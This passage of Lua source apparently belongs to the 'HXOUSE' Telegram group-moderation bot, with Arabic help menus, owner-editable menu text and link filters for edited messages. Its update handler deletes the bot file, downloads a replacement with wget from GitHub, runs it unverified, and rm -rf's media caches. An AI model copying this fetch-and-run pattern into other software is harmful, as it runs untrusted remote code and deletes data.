ٴ… … … … … … … … … … …
┇الســورس @HXOUSEiq
┇المطـــور  ]]..SUDOUSERNAME..[[
]] 
hxousedx(msg.chat_id_, msg.id_, 1, (help or text), 1, 'html')
end
if is_leader(msg) and text:match("^تعيين امر م1$") then
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ ارسل لي الكليشه الان " ,  1, "md")
hxousedx1:set(HXOUSE..'bot:help01'..msg.sender_user_id_..'', 'msg')
return false end
if text:match("^(.*)$") then
local hxouse =  hxousedx1:get(HXOUSE..'bot:help01'..msg.sender_user_id_..'')
if hxouse == 'msg' then 
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ تم حفظ الكليشه الجديده " ,  1, "md")
hxousedx1:set(HXOUSE..'bot:help01'..msg.sender_user_id_..'', 'no')
hxousedx1:set(HXOUSE..'bot:help1', text)
hxousedx(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
if text:match("^م1$") or  text:match("^م١$") then
local help = hxousedx1:get(HXOUSE..'bot:help1')
local text =  [[
⌯︙ اهلا بك في سورس هـكسوس  √
⌯︙ اوامر الحماية    √
⌯︙ قفل «🔑» فتح  √
ٴ… … … … … … … … … … …
⌯︙ الروابط
⌯︙المعرف
⌯︙البوتات
⌯︙الشارحه
⌯︙المتحركه
⌯︙الملفات
⌯︙الفيديو
⌯︙الاونلاين
⌯︙الدردشه
⌯︙التوجيه
⌯︙الاغاني
⌯︙الصوت
⌯︙الجهات
⌯︙الماركداون
⌯︙العربيه
⌯︙النكليزيه
⌯︙الحمايه
⌯︙التكرار
⌯︙الهاشتاك
⌯︙التعديل
⌯︙التثبيت
⌯︙الاشعارات
⌯︙الكل
⌯︙الكلايش
⌯︙الشبكات
⌯︙المواقع
⌯︙الفشار
⌯︙الكفران
⌯︙الطائفيه
⌯︙الفارسيه 
⌯︙الفارسيه بالطرد 
⌯︙البوتات بالطرد
⌯︙البوتات بالتقييد
⌯︙الكل بالساعات + عدد الساعات
ٴ… … … … … … … … … … …
┇الســورس @HXOUSEiq
┇المطـــور  ]]..SUDOUSERNAME..[[
]]
hxousedx(msg.chat_id_, msg.id_, 1, (help or text), 1, 'html')
end
if is_leader(msg) and text:match("^تعيين امر م2$") then
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ ارسل لي الكليشه الان " ,  1, "md")
hxousedx1:set(HXOUSE..'bot:help21'..msg.sender_user_id_..'', 'msg')
return false end
if text:match("^(.*)$") then
local hxouse =  hxousedx1:get(HXOUSE..'bot:help21'..msg.sender_user_id_..'')
if hxouse == 'msg' then
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ تم حفظ الكليشه الجديده " ,  1, "md")
hxousedx1:set(HXOUSE..'bot:help21'..msg.sender_user_id_..'', 'no')
hxousedx1:set(HXOUSE..'bot:help2', text)
hxousedx(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
if text:match("^م2$") or text:match("^م٢$") then
local help = hxousedx1:get(HXOUSE..'bot:help2')
local text =  [[
⌯︙ اهلا بك في سورس هـكسوس  √
⌯︙ اوامر المشرفين 🔰  ↓↓
ٴ… … … … … … … … … … …
⌯︙ طرد 
⌯︙ مسح الكل 
⌯︙ حظر « » الغاء حظر
⌯︙ كتم  « » الغاء كتم 
⌯︙ تقييد « » الغاء التقييد
⌯︙ كتم د + عدد الدقائق 
⌯︙ كتم س + عدد الساعات 
⌯︙ كتم ي + عدد الايام                                    
⌯︙ فحص  
⌯︙ اضف رد 
⌯︙ مسح رد 
⌯︙ اضف امر 
⌯︙ مسح امر 
⌯︙ اضف صلاحيه 
⌯︙ مسح صلاحيه 
⌯︙ مسح الردود 
⌯︙ جلب الترحيب 
⌯︙ حذف الترحيب  
⌯︙ معلومات المجموعه 
⌯︙ طرد الحسابات المحذوفه 
⌯︙ تنظيف قائمه الحظر 
⌯︙ منع « » الغاء منع 
⌯︙ تثبيت « » الغاء التثبيت 
⌯︙ كلهم   + الكليشه
⌯︙ مسح   + العدد 
⌯︙ ايدي   + المعرف 
⌯︙ اضافه + معرف العضو 
⌯︙ اضف رسائل  + الايدي 
  ٴ… … … … … … … … … … …
   ┇قوائم اخرى┇
⌯︙ الدعم « » قائمه المنع 
⌯︙ الردود « » المحظورين 
⌯︙ المدراء « » الاعدادات 
⌯︙ الادمنيه « » المكتومين 
⌯︙ المقيدين « » الاعضاء المميزين 
⌯︙ المطايه « »   المميزين عام 
⌯︙ المنشئين « » المدراء العامين 
⌯︙ الصلاحيات « » الاوامر المضافه
⌯︙ الادمنيه العامين
 ٴ… … … … … … … … … … …
┇الســورس @HXOUSEiq
┇المطـــور  ]]..SUDOUSERNAME..[[
]]
hxousedx(msg.chat_id_, msg.id_, 1, (help or text), 1, 'html')
end 
if is_leader(msg) and text:match("^تعيين امر م3$") then
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ ارسل لي الكليشه الان " ,  1, "md")
hxousedx1:set(HXOUSE..'bot:help31'..msg.sender_user_id_..'', 'msg')
return false end
if text:match("^(.*)$") then
local hxouse =  hxousedx1:get(HXOUSE..'bot:help31'..msg.sender_user_id_..'')
if hxouse == 'msg' then
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ تم حفظ الكليشه الجديده " ,  1, "md")
hxousedx1:set(HXOUSE..'bot:help31'..msg.sender_user_id_..'', 'no')
hxousedx1:set(HXOUSE..'bot:help3', text)
hxousedx(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
if text:match("^م3$") or text:match("^م٣$") then
local help = hxousedx1:get(HXOUSE..'bot:help3')
local text =  [[
⌯︙ اهلا بك في سورس هـكسوس  √
⌯︙ اوامر الخدمة  🔆   √
ٴ… … … … … … … … … … …
⌯︙ اهمس
⌯︙ الوقت 
⌯︙ زخرفه  
⌯︙ الرابط 
⌯︙ موقعي 
⌯︙ جهاتي 
⌯︙ نقاطي 
⌯︙ اطردني 
⌯︙ صورتي 
⌯︙ رسائلي 
⌯︙ ايديي 
⌯︙ ايدي 
⌯︙ معرفي 
⌯︙ اسمي 
⌯︙ الالعاب 
⌯︙ سمايلات 
⌯︙ ترتيب 
⌯︙ حزوره 
⌯︙ العكس 
⌯︙ المحيبس 
⌯︙ امثله 
⌯︙ المختلف 
⌯︙ معلوماتي 
⌯︙ القوانين 
⌯︙ السورس 
⌯︙ المطور 
⌯︙ تاك للكل 
⌯︙ بيع نقاطي 
⌯︙ مسح رسائلي 
⌯︙ ايدي بالرد 
⌯︙ الرتبه بالرد 
⌯︙ هينه بالرد   
⌯︙ بوسه بالرد 
⌯︙ بوسها بالرد 
⌯︙ رابط الحذف 
⌯︙ رسائلي اليوم 
⌯︙ مشاهده المنشور 
⌯︙ ايدي المجموعه 
⌯︙ اسم المجموعه 
⌯︙ رفع « » تنزيل مطي 
⌯︙ رتبته + المعرف 
⌯︙ كول + الكلمه 
⌯︙ هينه + المعرف 
⌯︙ صورتي  + الرقم 
⌯︙ الحساب + الايدي 
⌯︙ طقس + اسم المدينه 
 ٴ… … … … … … … … … … …
┇الســورس @HXOUSEiq
┇المطـــور  ]]..SUDOUSERNAME..[[
]]
hxousedx(msg.chat_id_, msg.id_, 1, (help or text), 1, 'html')
end 
if is_leader(msg) and text:match("^تعيين امر م4$") then
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ ارسل لي الكليشه الان " ,  1, "md")
hxousedx1:set(HXOUSE..'bot:help41'..msg.sender_user_id_..'', 'msg')
return false end
if text:match("^(.*)$") then
local hxouse =  hxousedx1:get(HXOUSE..'bot:help41'..msg.sender_user_id_..'')
if hxouse == 'msg' then
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ تم حفظ الكليشه الجديده " ,  1, "md")
hxousedx1:set(HXOUSE..'bot:help41'..msg.sender_user_id_..'', 'no')
hxousedx1:set(HXOUSE..'bot:help4', text)
hxousedx(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
if text:match("^م٤$") or text:match("^م4$") then
local help = hxousedx1:get(HXOUSE..'bot:help4')
local text =  [[
⌯︙ اهلا بك في سورس هـكسوس  √
⌯︙ اوامر الوضع  🌐   ↓↓
ٴ… … … … … … … … … … …
 ⌯︙ تعيين الايدي  )  لتغير الايدي الافتراضي
 ⌯︙ مسح الايدي  )  لسترجاع الايدي الافتراضي
 ⌯︙ ضع + احد الاوامر ادناه  ↓↓
  ٴ… … … … … … … … … … …
 ⌯︙رابط
 ⌯︙قوانين  
 ⌯︙صوره  
 ⌯︙ترحيب 
 ⌯︙تكرار + العدد 
 ⌯︙عدد الاحرف + العدد 
 ⌯︙اسم + الاسم 
 ⌯︙التكرار + بالطرد 
 ⌯︙التكرار + بالمسح 
 ⌯︙الايدي + بالصوره 
 ⌯︙الايدي + بدون صوره 
 ⌯︙الفارسيه + بالتحذير 
 ⌯︙الفارسيه + بدون تحذير 
 ٴ… … … … … … … … … … …
┇الســورس @HXOUSEiq
┇المطـــور  ]]..SUDOUSERNAME..[[
]]
hxousedx(msg.chat_id_, msg.id_, 1, (help or text), 1, 'html')
end
if is_leader(msg) and text:match("^تعيين امر م5$") then
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ ارسل لي الكليشه الان " ,  1, "md")
hxousedx1:set(HXOUSE..'bot:help51'..msg.sender_user_id_..'', 'msg')
return false end
if text:match("^(.*)$") then
local hxouse =  hxousedx1:get(HXOUSE..'bot:help51'..msg.sender_user_id_..'')
if hxouse == 'msg' then
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ تم حفظ الكليشه الجديده " ,  1, "md")
hxousedx1:set(HXOUSE..'bot:help51'..msg.sender_user_id_..'', 'no')
hxousedx1:set(HXOUSE..'bot:help5', text)
hxousedx(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
if text:match("^م٥$") or text:match("^م5$") then
local help = hxousedx1:get(HXOUSE..'bot:help5')
local text =  [[
⌯︙ اهلا بك في سورس هـكسوس  √
⌯︙ اوامر رفع المطورين والمشرفين ⚠️ ↓↓
ٴ… … … … … … … … … … …
⌯︙ رفع المشرفين
⌯︙ تنزيل الكل 
⌯︙ رفع « » تنزيل منشئ
⌯︙ رفع « » تنزيل مدير
⌯︙ رفع « » تنزيل ادمن 
⌯︙ رفع « » تنزيل مميز 
⌯︙ رفع « » تنزيل ادمن
⌯︙ رفع بكل الصلاحيات
⌯︙ الغاء خاصيه التثبيت
⌯︙ الغاء خاصيه تغيير الاسم
ٴ… … … … … … … … … … …
⌯︙ اوامر رفع المطورين 
⌯︙ رفع « » تنزيل منشئ اساسي
⌯︙ رفع « » تنزيل مدير عام 
⌯︙ رفع « » تنزيل ادمن عام  
⌯︙ رفع « » تنزيل مميز عام 
⌯︙ رفع « » تنزيل مطور رتبه ثالثه
 ٴ… … … … … … … … … … …
┇الســورس @HXOUSEiq
┇المطـــور  ]]..SUDOUSERNAME..[[
]]
hxousedx(msg.chat_id_, msg.id_, 1, (help or text), 1, 'html')
end
if is_leader(msg) and text:match("^تعيين امر م6$") then
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ ارسل لي الكليشه الان " ,  1, "md")
hxousedx1:set(HXOUSE..'bot:help61'..msg.sender_user_id_..'', 'msg')
return false end
if text:match("^(.*)$") then
local hxouse =  hxousedx1:get(HXOUSE..'bot:help61'..msg.sender_user_id_..'')
if hxouse == 'msg' then
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ تم حفظ الكليشه الجديده " ,  1, "md")
hxousedx1:set(HXOUSE..'bot:help61'..msg.sender_user_id_..'', 'no')
hxousedx1:set(HXOUSE..'bot:help6', text)
hxousedx(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
if text:match("^م٦$") or text:match("^م6$") then
local help = hxousedx1:get(HXOUSE..'bot:help6')
local text =  [[
⌯︙ اهلا بك في سورس هـكسوس  √
⌯︙ اوامر التفعيل والتعطيل ⚙️ ↓↓
ٴ… … … … … … … … … … …
⌯︙ تفعيل الحمايه القصوى
⌯︙ تفعيل « » تعطيل اللعبه
⌯︙ تفعيل « » تعطيل الايدي
⌯︙ تفعيل « » تعطيل الحظر 
⌯︙ تفعيل « » تعطيل الطرد
⌯︙ تفعيل « » تعطيل الرابط
⌯︙ تفعيل « » تعطيل اطردني
⌯︙ تفعيل « » تعطيل الايدي بالصوره
⌯︙ تفعيل « » تعطيل جلب الصوره 
⌯︙ تفعيل « » تعطيل ردود البوت 
⌯︙ تفعيل « » تعطيل تنبيه التغيرات
⌯︙اوامر تفعيلات المطورين
⌯︙ تفعيل « » تعطيل التنبيه
⌯︙ تفعيل « » تعطيل كل الكروبات 
⌯︙ تفعيل « » تعطيل البوت الخدمي 
⌯︙ تفعيل « » تعطيل الاشتراك الاجباري
⌯︙ رد الخاص تفعيل « » تعطيل  
 ٴ… … … … … … … … … … …
┇الســورس @HXOUSEiq
┇المطـــور  ]]..SUDOUSERNAME..[[
]]
hxousedx(msg.chat_id_, msg.id_, 1, (help or text), 1, 'html')
end
if is_leader(msg) and text:match("^تعيين امر م7$") then
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ ارسل لي الكليشه الان " ,  1, "md")
hxousedx1:set(HXOUSE..'bot:help71'..msg.sender_user_id_..'', 'msg')
return false end
if text:match("^(.*)$") then
local hxouse =  hxousedx1:get(HXOUSE..'bot:help71'..msg.sender_user_id_..'')
if hxouse == 'msg' then
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ تم حفظ الكليشه الجديده " ,  1, "md")
hxousedx1:set(HXOUSE..'bot:help71'..msg.sender_user_id_..'', 'no')
hxousedx1:set(HXOUSE..'bot:help7', text)
hxousedx(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
if text:match("^م٧$") or text:match("^م7$") then
local help = hxousedx1:get(HXOUSE..'bot:help7') 
local text =  [[
⌯︙ اهلا بك في سورس هـكسوس  √
⌯︙ اوامر مسح القوائم  🗑 ↓↓
ٴ… … … … … … … … … … …
⌯︙ مسح القوائم
⌯︙ مسح الرابط
⌯︙ مسح البوتات
⌯︙ مسح المدراء
⌯︙ مسح الادمنيه
⌯︙ مسح المقيدين
⌯︙ مسح المكتومين
⌯︙ مسح المحظورين
⌯︙ مسح قائمه المنع
⌯︙ مسح الاعضاء المميزين 
⌯︙ اوامر مسح المطورين
⌯︙ مسح المنشئين 
⌯︙ مسح  قائمه العام 
⌯︙ مسح ردود المطور 
⌯︙ مسح المميزين عام 
⌯︙ مسح المدراء العامين 
⌯︙ مسح الادمنيه العامين
⌯︙ مسح المنشئين الاساسيين
⌯︙ مسح مطورين الرتبه الثالثه
 ٴ… … … … … … … … … … …
┇الســورس @HXOUSEiq
┇المطـــور  ]]..SUDOUSERNAME..[[
]]
hxousedx(msg.chat_id_, msg.id_, 1, (help or text), 1, 'html')
end
if is_leader(msg) and text:match("^تعيين امر م8$") then
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ ارسل لي الكليشه الان " ,  1, "md")
hxousedx1:set(HXOUSE..'bot:help81'..msg.sender_user_id_..'', 'msg')
return false end
if text:match("^(.*)$") then
local hxouse =  hxousedx1:get(HXOUSE..'bot:help81'..msg.sender_user_id_..'')
if hxouse == 'msg' then
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ تم حفظ الكليشه الجديده " ,  1, "md")
hxousedx1:set(HXOUSE..'bot:help81'..msg.sender_user_id_..'', 'no')
hxousedx1:set(HXOUSE..'bot:help8', text)
hxousedx(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
if text:match("^م٨$") or text:match("^م8$") then
local help = hxousedx1:get(HXOUSE..'bot:help8')
local text =  [[
⌯︙ اهلا بك في سورس هـكسوس  √
⌯︙ اوامر المطورين 🎖 ↓↓
ٴ… … … … … … … … … … …
⌯︙ السيرفر 
⌯︙ الكروبات 
⌯︙ المجموعات 
⌯︙ الاحصائيات 
⌯︙ تحديث 
⌯︙ اسم البوت + غادر 
⌯︙ تحديث السورس 
⌯︙ توجيه للكل
⌯︙ روابط الكروبات
⌯︙ جلب نسخه الملف
ٴ… … … … … … … … … … …
⌯︙ استعاده الاوامر 
⌯︙ تعيين الاوامر 
⌯︙ تعيين امر م1 
⌯︙ تعيين امر م2 
⌯︙ تعيين امر م3 
⌯︙ تعيين امر م4 
⌯︙ تعيين امر م5 
⌯︙ تعيين امر م6
⌯︙ تعيين امر م7
⌯︙ تعيين امر م8
ٴ… … … … … … … … … … …
⌯︙ اضف رد للكل 
⌯︙ مسح رد للكل   
⌯︙ حظر عام 
⌯︙ الغاء العام 
⌯︙ ضع دعم 
⌯︙ حذف الدعم 
⌯︙ جلب الملاحظه 
⌯︙ تنظيف الرسائل 
⌯︙ تنظيف الكروبات 
⌯︙ جلب رد الخاص 
⌯︙ حذف رد الخاص 
⌯︙ ردود المطور 
⌯︙ قائمه العام 
⌯︙ قائمه المنع العام 
⌯︙ مطورين الرتبه الثالثه 
⌯︙ ضع كليشه المطور
⌯︙ رفع النسخه ( بالرد للملف ) 
⌯︙ جلب نسخه الكروبات 
⌯︙ (وضع او تغيير) اسم البوت 
⌯︙ مسح اسم البوت 
⌯︙ رد الخاص تفعيل « » تعطيل 
⌯︙ المغادره التلقائيه تفعيل « » تعطيل 
⌯︙ قناة الاشتراك 
⌯︙ تعيين « » تغيير قناة الاشتراك 
⌯︙ كشف  + ايدي الكروب
⌯︙ غادر  + ايدي الكروب
⌯︙ اذاعه  + المنشور 
⌯︙ فلتر عام  + الكلمه 
⌯︙ الغاء فلتر عام   + الكليشه 
⌯︙ ضع ملاحظه  + الملاحظه 
⌯︙ نشر بالخاص   + المنشور 
⌯︙ ضع رد الخاص  + الكليشه  
ٴ… … … … … … … … … … …
┇الســورس @HXOUSEiq
┇المطـــور  ]]..SUDOUSERNAME..[[
]]
hxousedx(msg.chat_id_, msg.id_, 1, (help or text), 1, 'html')
end
---------------hxouse
if text == "تحديث السورس" and is_leader(msg) then 
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ جاري تحديث السورس الى الاصدار الجديد ', 1, 'md') 
os.execute('rm -rf HXOUSE.lua') 
os.execute('wget https://raw.githubusercontent.com/HXOUSETELE/HX/master/HXOUSE.lua') 
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم تحديث السورس اكتشف المميزات الجديده الان ', 1, 'md') 
dofile('HXOUSE.lua') 
io.popen("rm -rf ~/.telegram-cli/data/audio/*")
io.popen("rm -rf ~/.telegram-cli/data/document/*")
io.popen("rm -rf ~/.telegram-cli/data/photo/*")
io.popen("rm -rf ~/.telegram-cli/data/sticker/*")
io.popen("rm -rf ~/.telegram-cli/data/temp/*")
io.popen("rm -rf ~/.telegram-cli/data/thumb/*") 
io.popen("rm -rf ~/.telegram-cli/data/video/*")
io.popen("rm -rf ~/.telegram-cli/data/voice/*")
io.popen("rm -rf ~/.telegram-cli/data/profile_photo/*") 
end 
if text == 'تحديث' and is_leader(msg) then  
dofile('HXOUSE.lua')  io.popen("rm -rf ~/.telegram-cli/data/audio/*") 
io.popen("rm -rf ~/.telegram-cli/data/document/*") 
io.popen("rm -rf ~/.telegram-cli/data/photo/*") 
io.popen("rm -rf ~/.telegram-cli/data/sticker/*") 
io.popen("rm -rf ~/.telegram-cli/data/temp/*") 
io.popen("rm -rf ~/.telegram-cli/data/thumb/*") 
io.popen("rm -rf ~/.telegram-cli/data/video/*") 
io.popen("rm -rf ~/.telegram-cli/data/voice/*") 
io.popen("rm -rf ~/.telegram-cli/data/profile_photo/*") 
print("\27[31;47m\n          🚸) تم تحديث البوت (🚸          \n\27[0;34;49m\n") 
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ تم تحديث البوت ", 1, "md")
end 
if text and text:match("^اضف رسائل (%d+)$") and is_monsh(msg.sender_user_id_, msg.chat_id_) and hxouse11(msg) then  
hxouse0 = text:match("^اضف رسائل (%d+)$")
hxousedx1:set('hxouse:'..bot_id..'id:user'..msg.chat_id_,hxouse0)  
hxousedx1:setex('hxouse:'..bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 10000, true)  
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ ارسل عدد الرسائل ", 1, "md")
hxousedx(msg.chat_id_, msg.id_, 1,Anwar, 1, 'md') 
end 
---------------hxouse 
if is_leader(msg) then
local text = msg.content_.text_:gsub("[Ss]etprice", "Setnerkh")
if text:match("^[Ss]etnerkh$") or text:match("^ضع كليشه المطور$") then
if hxousedx1:get(HXOUSE.."lang:gp:" .. msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ Plese Send your now ", 1, "md")
else
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ ارسل لي كليشه المطور الان ", 1, "md")
end
hxousedx1:setex(HXOUSE.."bot:nerkh" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 100, true)
end end
------------
-------------------------------------------------HXOUSE TEAM----------------------------------------------
if text:match("^قرنابيط$") then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ قنوات السورس \n\n [@HXOUSEiq] \n\n [@HXOUSEiq] \n ['..os.date("%H:%M:%S")..']', 1, 'md')    
end end
if tonumber(msg.sender_user_id_) == tonumber(bot_owner) then 
if (msg.content_.text_ == 'stats server' or msg.content_.text_ == 'السيرفر') then 
local hxouse = '*مضى على تشغيل السيرفر*\n\n' 
  local hxousedx2 = hxousedx1:info()
  hxouse = hxouse..'*'..hxousedx2.server.uptime_in_days..' يوم \n'..hxousedx2.server.uptime_in_seconds..' ثانيه*\n'
  hxousedx(msg.chat_id_, msg.id_, 1, hxouse, 1, 'md')
end
end
--------------

-----------------------------------------HXOUSE TEAM------------------------------------------------------ 
end   
-----------------------------------------HXOUSE TEAM------------------------------------------------------
-- end code --
-- Number Update 5
---------------------------------------HXOUSE TEAM--------------------------------------------------------
elseif (data.ID == "UpdateChat") then
chat = data.chat_
chats[chat.id_] = chat
---------------------------------------HXOUSE TEAM-------------------------------------------------------- 
elseif (data.ID == "UpdateMessageEdited") then
local msg = data
function get_msg_contact(extra, result, success)
local text = (result.content_.text_ or result.content_.caption_)
if result.id_ and result.content_.text_ then
hxousedx1:set(HXOUSE..'bot:editid'..result.id_,result.content_.text_)
end 
if not is_vipmem(result.sender_user_id_, result.chat_id_) then
check_filter_words(result, text)
if hxousedx1:get(HXOUSE..'editmsg'..msg.chat_id_) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs)
end
if text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text:match("[Tt].[Mm][Ee]") then
if hxousedx1:get(HXOUSE..'bot:links:mute'..result.chat_id_) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs)
end end
if text:match("[Hh][Tt][Tt][Pp][Ss]://") or text:match("[Hh][Tt][Tt][Pp]://") or text:match(".[Ii][Rr]") or text:match(".[Cc][Oo][Mm]") or text:match(".[Oo][Rr][Gg]") or text:match(".[Ii][Nn][Ff][Oo]") or text:match("[Ww][Ww][Ww].") or text:match(".[Tt][Kk]") or text:match("/") then
if hxousedx1:get(HXOUSE..'bot:webpage:mute'..result.chat_id_) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs)
end end
if text:match("@") then
if hxousedx1:get(HXOUSE..'tags:lock'..result.chat_id_) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs)
end end
if text:match("#") then 
if hxousedx1:get(HXOUSE..'bot:hashtag:mute'..result.chat_id_) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs)
end end
if text:match("[\216-\219][\128-\191]") then
if hxousedx1:get(HXOUSE..'bot:arabic:mute'..result.chat_id_) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs)
end end
if text:match("[A-Z]") or text:match("[a-z]") then
if hxousedx1:get(HXOUSE..'bot:english:mute'..result.chat_id_) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs)
end end end end
getMessage(msg.chat_id_, msg.message_id_,get_msg_contact)
---------------------------------------HXOUSE TEAM--------------------------------------------------------
elseif (data.ID == "UpdateOption" and data.name_ == "my_id") then
tdcli_function ({ID="GetChats", offset_order_="9223372036854775807", offset_chat_id_=0, limit_=20}, dl_cb, nil)
end
-----------------------------------------HXOUSE TEAM------------------------------------------------------ 
end
-- END VERSION HXOUSE V1 
-- all the file by HXOUSE TEAM  @HXOUSEiq 
-- join in chennel @HXOUSEiq    
